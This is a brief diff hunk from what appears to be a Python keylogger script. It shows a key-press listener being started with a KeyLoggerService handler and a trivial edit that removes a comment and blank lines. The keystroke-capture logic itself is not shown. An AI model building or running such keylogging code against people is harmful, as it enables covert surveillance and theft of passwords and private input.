@@ -46,6 +46,4 @@ FileWriter = FileWriter()
 KeyLoggerService = KeyLoggerService()
 with Listener(on_press=KeyLoggerService.on_press) as listener:
     listener.join()
-
-
-# know im at the main
+    
